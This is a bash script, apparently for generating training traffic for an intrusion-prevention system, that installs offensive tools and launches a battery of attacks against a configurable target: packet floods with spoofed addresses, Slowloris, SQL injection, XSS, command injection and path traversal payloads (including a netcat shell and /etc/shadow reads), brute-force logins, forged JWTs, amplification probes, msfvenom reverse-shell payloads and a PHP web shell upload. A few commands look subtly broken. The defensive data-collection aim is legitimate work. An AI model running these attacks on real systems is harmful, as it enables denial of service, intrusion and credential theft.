#!/bin/bash
# =============================================================================
# AEGIS IPS TRAINING - ATTACK GENERATOR with AUTO-SETUP
# Run this in a separate terminal while collector.py is running
# =============================================================================

# ==================== CONFIGURATION ====================
TARGET="127.0.0.1"
TARGET_HTTP="80"
TARGET_HTTPS="443"
TARGET_MYSQL="3306"
TARGET_SSH="22"
TARGET_DNS="53"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Attack counter
ATTACK_COUNT=0
START_TIME=$(date +%s)

# Check if running with sudo
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run with sudo for network attacks${NC}"
   echo -e "${YELLOW}Please run: sudo $0${NC}"
   exit 1
fi

print_attack() {
    ((ATTACK_COUNT++))
    echo -e "${PURPLE}[Attack #$ATTACK_COUNT]${NC} ${CYAN}$1${NC}"
    sleep 0.3
}

print_phase() {
    echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║ $1${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}\n"
}

print_status() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_error() {
    echo -e "${RED}[!]${NC} $1"
}

# ==================== REQUIREMENT CHECKING & INSTALLATION ====================

check_and_install_tools() {
    print_phase "🔧 CHECKING AND INSTALLING REQUIRED TOOLS"
    
    # Update package list
    print_status "Updating package list..."
    apt-get update -qq
    
    # List of required tools and their packages
    declare -A tools=(
        ["hping3"]="hping3"
        ["nmap"]="nmap"
        ["curl"]="curl"
        ["python3"]="python3"
        ["slowhttptest"]="slowhttptest"
        ["gobuster"]="gobuster"
        ["hydra"]="hydra"
        ["nikto"]="nikto"
        ["sqlmap"]="sqlmap"
        ["dig"]="dnsutils"
        ["nc"]="netcat-openbsd"
        ["openssl"]="openssl"
        ["arping"]="arping"
        ["tcpdump"]="tcpdump"
        ["msfvenom"]="metasploit-framework"
    )
    
    MISSING_TOOLS=()
    
    # Check each tool
    for tool in "${!tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            print_warning "$tool is missing"
            MISSING_TOOLS+=("${tools[$tool]}")
        else
            print_success "$tool is installed"
        fi
    done
    
    # Install missing tools if any
    if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
        print_warning "Installing missing tools: ${MISSING_TOOLS[*]}"
        
        # Special handling for slowhttptest (may need from source)
        if [[ " ${MISSING_TOOLS[@]} " =~ "slowhttptest" ]]; then
            print_status "Installing slowhttptest from source..."
            apt-get install -y build-essential libssl-dev libcurl4-openssl-dev
            cd /tmp
            git clone https://github.com/shekyan/slowhttptest.git
            cd slowhttptest
            ./configure && make && make install
            cd -
        fi
        
        # Install all other missing packages
        if [ ${#MISSING_TOOLS[@]} -gt 0 ]; then
            # Remove slowhttptest from list if we already handled it
            MISSING_TOOLS=(${MISSING_TOOLS[@]/slowhttptest})
            if [ ${#MISSING_TOOLS[@]} -gt 0 ]; then
                apt-get install -y "${MISSING_TOOLS[@]}"
            fi
        fi
        
        print_success "Tools installed successfully"
    else
        print_success "All required tools are already installed"
    fi
    
    # Create wordlist directory if missing
    if [ ! -f /usr/share/wordlists/dirb/common.txt ]; then
        print_status "Installing wordlists..."
        apt-get install -y wordlists
    fi
    
    # Check Python modules
    print_status "Checking Python modules..."
    python3 -c "import scapy" 2>/dev/null || {
        print_warning "Installing scapy for Python..."
        pip3 install scapy
    }
    
    print_success "All requirements satisfied!"
    sleep 2
}

# ==================== ATTACK FUNCTIONS ====================

# Layer 1: Network Layer Attacks
network_attacks() {
    print_phase "🌐 NETWORK LAYER ATTACKS"
    
    # SYN Flood
    print_attack "SYN Flood - Port 80"
    timeout 8 sudo hping3 -S -p 80 --flood --rand-source $TARGET -c 3000 2>/dev/null &
    
    # SYN Flood - Port 443
    print_attack "SYN Flood - Port 443"
    timeout 8 sudo hping3 -S -p 443 --flood --rand-source $TARGET -c 3000 2>/dev/null &
    
    # SYN Flood - Port 22
    print_attack "SYN Flood - Port 22"
    timeout 8 sudo hping3 -S -p 22 --flood --rand-source $TARGET -c 3000 2>/dev/null &
    
    # UDP Flood
    print_attack "UDP Flood - Random ports"
    timeout 8 sudo hping3 --udp --flood --rand-source $TARGET -c 3000 2>/dev/null &
    
    # ICMP Flood (Ping Flood)
    print_attack "ICMP Flood (Ping Flood)"
    timeout 8 sudo hping3 --icmp --flood $TARGET -c 2000 2>/dev/null &
    
    # Fragmented Packet Attack
    print_attack "Fragmented Packet Attack"
    timeout 8 sudo hping3 -S -p 80 --flood --frag $TARGET -c 2000 2>/dev/null &
    
    # FIN Scan
    print_attack "FIN Scan"
    timeout 5 sudo hping3 -F -p 80 --scan 1-500 $TARGET 2>/dev/null &
    
    # XMAS Tree Attack
    print_attack "XMAS Tree Attack (FIN+URG+PSH)"
    timeout 5 sudo hping3 -F -U -P -p 80 --scan 1-500 $TARGET 2>/dev/null &
    
    # ACK Scan
    print_attack "ACK Scan"
    timeout 5 sudo hping3 -A -p 80 --scan 1-500 $TARGET 2>/dev/null &
    
    # TCP Null Scan
    print_attack "TCP Null Scan"
    timeout 5 sudo nmap -sN -p 1-500 $TARGET 2>/dev/null &
    
    # IP Spoofing
    print_attack "IP Spoofing Attempts"
    for i in {1..20}; do
        sudo hping3 -S -p 80 -a "192.168.$i.$i" $TARGET -c 1 2>/dev/null &
    done &
    
    wait
    sleep 2
}

# Layer 2: Transport Layer Attacks
transport_attacks() {
    print_phase "🚚 TRANSPORT LAYER ATTACKS"
    
    # SYN-ACK Flood
    print_attack "SYN-ACK Flood"
    timeout 8 sudo hping3 -SA -p 80 --flood $TARGET -c 3000 2>/dev/null &
    
    # RST Flood
    print_attack "RST Flood"
    timeout 8 sudo hping3 -R -p 80 --flood $TARGET -c 3000 2>/dev/null &
    
    # TCP Connection Flood
    print_attack "TCP Connection Flood"
    timeout 10 python3 -c "
import socket, threading, time
def conn_flood():
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('$TARGET', 80))
            s.send(b'GET / HTTP/1.1\r\nHost: $TARGET\r\n\r\n')
            time.sleep(0.1)
            s.close()
        except: pass
threads = []
for _ in range(30):
    t = threading.Thread(target=conn_flood)
    t.start()
    threads.append(t)
for t in threads:
    t.join()
" 2>/dev/null &
    
    # TCP Reset Attack
    print_attack "TCP Reset Attack"
    timeout 8 sudo hping3 -R -p 80 --flood $TARGET -c 2000 2>/dev/null &
    
    # Port Scan (Connect Scan)
    print_attack "TCP Connect Port Scan"
    timeout 5 sudo nmap -sT -p 1-1000 $TARGET 2>/dev/null &
    
    # UDP Port Scan
    print_attack "UDP Port Scan"
    timeout 5 sudo nmap -sU -p 1-500 $TARGET 2>/dev/null &
    
    wait
    sleep 2
}

# Layer 3: Application Layer Attacks
application_attacks() {
    print_phase "💻 APPLICATION LAYER ATTACKS"
    
    # Slowloris
    if command -v slowhttptest &> /dev/null; then
        print_attack "Slowloris Attack"
        timeout 12 slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://$TARGET:$TARGET_HTTP -x 24 -p 3 2>/dev/null &
    fi
    
    # Slow POST
    if command -v slowhttptest &> /dev/null; then
        print_attack "Slow POST Attack"
        timeout 12 slowhttptest -c 500 -B -i 10 -r 200 -t POST -u http://$TARGET:$TARGET_HTTP -x 24 -p 3 2>/dev/null &
    fi
    
    # HTTP Pipelining Flood
    print_attack "HTTP Pipelining Flood"
    timeout 8 python3 -c "
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('$TARGET', 80))
    req = 'GET / HTTP/1.1\r\nHost: $TARGET\r\n\r\n' * 50
    for _ in range(20):
        s.send(req.encode())
except: pass
" 2>/dev/null &
    
    # HTTP Request Flood
    print_attack "HTTP Request Flood"
    for i in {1..300}; do
        curl -s "http://$TARGET:$TARGET_HTTP/" -o /dev/null &
        if [ $((i % 50)) -eq 0 ]; then
            wait
        fi
    done &
    
    wait
    sleep 2
}

# Web Application Attacks
web_attacks() {
    print_phase "🌐 WEB APPLICATION ATTACKS"
    
    # Directory Bruteforce
    if command -v gobuster &> /dev/null; then
        print_attack "Directory Bruteforce"
        timeout 10 gobuster dir -u "http://$TARGET:$TARGET_HTTP" -w /usr/share/wordlists/dirb/common.txt -t 30 -q 2>/dev/null &
    fi
    
    # SQL Injection
    print_attack "SQL Injection Attempts"
    sql_payloads=(
        "'" 
        "' OR '1'='1" 
        "'; DROP TABLE users; --" 
        "1 UNION SELECT ALL FROM users" 
        "' UNION SELECT 1,2,3--"
        "admin' --"
        "' AND 1=1 --"
        "' AND SLEEP(5) --"
    )
    for payload in "${sql_payloads[@]}"; do
        curl -s "http://$TARGET:$TARGET_HTTP/page?id=$payload" -o /dev/null &
        curl -s "http://$TARGET:$TARGET_HTTP/search?q=$payload" -o /dev/null &
    done &
    
    # XSS Attacks
    print_attack "XSS Attempts"
    xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert(1)>"
        "javascript:alert('XSS')"
        "<body onload=alert('XSS')>"
        "><script>alert(1)</script>"
        "\"><script>alert(1)</script>"
        "<svg onload=alert(1)>"
    )
    for payload in "${xss_payloads[@]}"; do
        curl -s "http://$TARGET:$TARGET_HTTP/comment?text=$payload" -o /dev/null &
        curl -s "http://$TARGET:$TARGET_HTTP/search?q=$payload" -o /dev/null &
    done &
    
    # Command Injection
    print_attack "Command Injection Attempts"
    cmd_payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "&& whoami"
        "\`id\`"
        "\$(whoami)"
        "; cat /etc/passwd"
        "| nc -e /bin/sh"
    )
    for payload in "${cmd_payloads[@]}"; do
        curl -s "http://$TARGET:$TARGET_HTTP/exec?cmd=$payload" -o /dev/null &
    done &
    
    # Path Traversal
    print_attack "Path Traversal Attempts"
    traversal_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\win.ini"
        "....//....//....//etc/passwd"
        "../../../../etc/shadow"
        "..;/..;/..;/etc/passwd"
    )
    for payload in "${traversal_payloads[@]}"; do
        curl -s "http://$TARGET:$TARGET_HTTP/file?name=$payload" -o /dev/null &
    done &
    
    wait
    sleep 2
}

# Authentication Attacks
auth_attacks() {
    print_phase "🔐 AUTHENTICATION ATTACKS"
    
    # Brute Force - HTTP Form
    print_attack "HTTP Login Bruteforce"
    for pass in password admin 123456 root toor test qwerty letmein; do
        curl -s -X POST -d "username=admin&password=$pass" "http://$TARGET:$TARGET_HTTP/login" -o /dev/null &
    done &
    
    # Brute Force - Basic Auth
    print_attack "Basic Auth Bruteforce"
    for pass in admin 123456 password; do
        curl -s -u "admin:$pass" "http://$TARGET:$TARGET_HTTP/admin" -o /dev/null &
    done &
    
    # Session Hijacking Attempts
    print_attack "Session Hijacking Attempts"
    for session in "invalid123" "admin" "root" "sessionid=abc123" "PHPSESSID=test"; do
        curl -s -H "Cookie: $session" "http://$TARGET:$TARGET_HTTP/dashboard" -o /dev/null &
    done &
    
    # JWT Attacks
    print_attack "JWT Token Attacks"
    jwt_payloads=(
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9"
    )
    for jwt in "${jwt_payloads[@]}"; do
        curl -s -H "Authorization: Bearer $jwt" "http://$TARGET:$TARGET_HTTP/api/data" -o /dev/null &
    done &
    
    wait
    sleep 2
}

# DDoS & Amplification Attacks
ddos_attacks() {
    print_phase "💥 DDOS & AMPLIFICATION ATTACKS"
    
    # DNS Amplification
    print_attack "DNS Amplification Simulation"
    for domain in google.com facebook.com cloudflare.com github.com; do
        dig @"$TARGET" "$domain" ANY +dnssec +edns=0 +bufsize=4096 2>/dev/null &
    done &
    
    # NTP Amplification
    print_attack "NTP Amplification"
    for i in {1..50}; do
        echo -e "\x17\x00\x03\x2a\x00\x00\x00\x00" | nc -u "$TARGET" 123 2>/dev/null &
    done &
    
    # Memcached Amplification
    print_attack "Memcached Amplification"
    echo -e "stats\r\n" | nc -u "$TARGET" 11211 2>/dev/null &
    
    # SSDP Amplification
    print_attack "SSDP Amplification"
    echo -e "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n" | nc -u "$TARGET" 1900 2>/dev/null &
    
    wait
    sleep 2
}

# Protocol-Specific Attacks
protocol_attacks() {
    print_phase "📡 PROTOCOL-SPECIFIC ATTACKS"
    
    # SSL/TLS Attacks
    print_attack "SSL/TLS Attacks"
    echo "Q" | openssl s_client -connect "$TARGET:$TARGET_HTTPS" -tls1_2 2>/dev/null &
    echo "Q" | openssl s_client -connect "$TARGET:$TARGET_HTTPS" -ssl3 2>/dev/null &
    
    # DNS Cache Poisoning Attempt
    print_attack "DNS Cache Poisoning"
    dig @"$TARGET" www.google.com ANY +recurse 2>/dev/null &
    
    # ARP Spoofing
    print_attack "ARP Spoofing Attempt"
    arping -A -c 5 -I eth0 $TARGET 2>/dev/null &
    
    # DHCP Starvation
    print_attack "DHCP Starvation Simulation"
    for mac in {00..05}{00..05}{00..05}; do
        dhclient -r -cf /dev/null -lf /dev/null -pf /dev/null -s "$TARGET" 2>/dev/null &
    done &
    
    wait
    sleep 2
}

# Malware & Payload Delivery
malware_attacks() {
    print_phase "🦠 MALWARE & PAYLOAD DELIVERY"
    
    # Metasploit Payload Generation
    if command -v msfvenom &> /dev/null; then
        print_attack "Payload Generation Attempts"
        msfvenom -p linux/x86/shell_reverse_tcp LHOST=$TARGET LPORT=4444 -f elf -o /tmp/payload.elf 2>/dev/null &
        msfvenom -p windows/shell_reverse_tcp LHOST=$TARGET LPORT=4444 -f exe -o /tmp/payload.exe 2>/dev/null &
        msfvenom -p php/reverse_php LHOST=$TARGET LPORT=4444 -f raw -o /tmp/payload.php 2>/dev/null &
    fi
    
    # Malicious File Upload Attempts
    print_attack "Malicious File Uploads"
    echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
    curl -s -X POST -F "file=@/tmp/shell.php" "http://$TARGET:$TARGET_HTTP/upload" -o /dev/null &
    
    echo '<script>alert("XSS")</script>' > /tmp/xss.html
    curl -s -X POST -F "file=@/tmp/xss.html" "http://$TARGET:$TARGET_HTTP/upload" -o /dev/null &
    
    # Web Shell Attempts
    print_attack "Web Shell Access Attempts"
    for shell in shell.php cmd.php admin.php webshell.jsp; do
        curl -s "http://$TARGET:$TARGET_HTTP/$shell?cmd=id" -o /dev/null &
    done &
    
    wait
    sleep 2
}

# Advanced Evasion Techniques
evasion_attacks() {
    print_phase "🎭 EVASION TECHNIQUES"
    
    # IP Fragmentation Evasion
    print_attack "IP Fragmentation Evasion"
    sudo hping3 -S -p 80 --flood --frag --mtu 8 $TARGET -c 1000 2>/dev/null &
    
    # Decoy Scans
    print_attack "Decoy Scans"
    sudo nmap -D RND:10 $TARGET -p 80 2>/dev/null &
    
    # Idle Scan
    print_attack "Idle Scan"
    sudo nmap -sI zombie.host $TARGET 2>/dev/null &
    
    # MAC Address Spoofing
    print_attack "MAC Address Spoofing"
    for mac in 00:11:22:33:44:55 66:77:88:99:AA:BB; do
        sudo hping3 -S -p 80 --spoof "$mac" $TARGET -c 5 2>/dev/null &
    done &
    
    # Slow Scan (Stealth)
    print_attack "Slow Stealth Scan"
    sudo nmap -sS -T1 -p 1-100 $TARGET 2>/dev/null &
    
    wait
    sleep 2
}

# ==================== MAIN EXECUTION ====================

main() {
    clear
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════╗"
    echo "║                    AEGIS IPS TRAINING SUITE                        ║"
    echo "║                      COMPREHENSIVE ATTACK GENERATOR                ║"
    echo "║                         LAB USE ONLY                               ║"
    echo "╚═══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${YELLOW}⚠️  IMPORTANT:${NC}"
    echo "  - This script will generate 5000+ attack signatures"
    echo "  - Run this in a SEPARATE terminal from your collector.py"
    echo "  - Target: $TARGET"
    echo "  - Make sure your collector is already running"
    echo ""
    
    read -p "Press ENTER to continue or Ctrl+C to abort..."
    
    # Step 1: Check and install requirements
    check_and_install_tools
    
    # Step 2: Verify target is reachable
    print_status "Verifying target is reachable..."
    if ping -c 1 $TARGET &> /dev/null; then
        print_success "Target $TARGET is reachable"
    else
        print_warning "Target $TARGET is not responding to ping, but attacks will continue"
    fi
    
    # Step 3: Display attack plan
    print_phase "🎯 ATTACK SEQUENCE STARTING"
    echo "The following attack vectors will be launched:"
    echo "  1. Network Layer Attacks (SYN Flood, UDP Flood, ICMP Flood, etc.)"
    echo "  2. Transport Layer Attacks (SYN-ACK Flood, RST Flood, etc.)"
    echo "  3. Application Layer Attacks (Slowloris, Slow POST, etc.)"
    echo "  4. Web Application Attacks (SQLi, XSS, Command Injection, etc.)"
    echo "  5. Authentication Attacks (Bruteforce, Session Hijacking, etc.)"
    echo "  6. DDoS & Amplification Attacks (DNS, NTP, Memcached)"
    echo "  7. Protocol-Specific Attacks (SSL/TLS, DNS, ARP)"
    echo "  8. Malware & Payload Delivery"
    echo "  9. Evasion Techniques"
    echo ""
    
    read -p "Launch attacks? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 0
    fi
    
    # Execute all attack phases
    network_attacks
    transport_attacks
    application_attacks
    web_attacks
    auth_attacks
    ddos_attacks
    protocol_attacks
    malware_attacks
    evasion_attacks
    
    # Wait for all background jobs
    print_status "Waiting for all attacks to complete..."
    wait
    
    # Calculate runtime
    END_TIME=$(date +%s)
    RUNTIME=$((END_TIME - START_TIME))
    
    # Summary
    echo -e "\n${GREEN}"
    echo "╔═══════════════════════════════════════════════════════════════════╗"
    echo "║                    ATTACK SEQUENCE COMPLETE                        ║"
    echo "╚═══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${CYAN}Statistics:${NC}"
    echo "  - Total attacks launched: $ATTACK_COUNT"
    echo "  - Total runtime: $RUNTIME seconds"
    echo ""
    echo -e "${YELLOW}Next steps:${NC}"
    echo "  1. Check your collector.py output for captured traffic"
    echo "  2. Verify that packet capture contains all attack signatures"
    echo "  3. Use labeled data to train your IPS model"
    echo ""
    echo -e "${GREEN}Happy training! 🚀${NC}"
}

# Run main function
main